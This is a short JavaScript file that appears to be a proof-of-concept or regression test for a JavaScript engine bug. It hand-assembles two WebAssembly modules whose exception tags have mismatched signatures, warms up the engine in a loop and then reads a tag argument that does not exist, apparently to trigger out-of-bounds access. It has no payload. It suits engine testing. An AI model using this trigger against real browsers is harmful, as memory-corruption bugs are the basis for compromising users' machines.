const buf1 = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 1, 127, 0, 13, 5, 1, 0, 0, 7, 7, 1, 3, 116, 97, 103, 3, 0]);
const buf2 = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 6, 1, 96, 2, 127, 127, 0, 2, 9, 1, 1, 109, 3, 116, 97, 103, 3, 0, 3, 2, 1, 0, 7, 7, 1, 3, 114, 117, 110, 0, 0, 10, 11, 1, 9, 0, 65, 42, 65, 133, 10, 8, 0, 11]);

const mod1 = new WebAssembly.Module(buf1);
const mod2 = new WebAssembly.Module(buf2);

const instance1 = new WebAssembly.Instance(mod1);
const super_tag = instance1.exports.tag;
const imports = {
    m: {
        tag: super_tag
    }
};

let instance2 = null;
try {
    instance2 = new WebAssembly.Instance(mod2, imports);
} catch (e) {}

if (instance2) {
    const run = instance2.exports.run;

    function trigger(do_access_bug) {
        try {
            run();
        } catch (e) {
            if (e instanceof WebAssembly.Exception && e.is(super_tag)) {
                e.getArg(super_tag, 0);
                if (do_access_bug) {
                    e.getArg(super_tag, 1);
                }
            }
        }
    }

    for (let i = 0; i < 100; i++) {
        trigger(false);
    }
    trigger(true);
}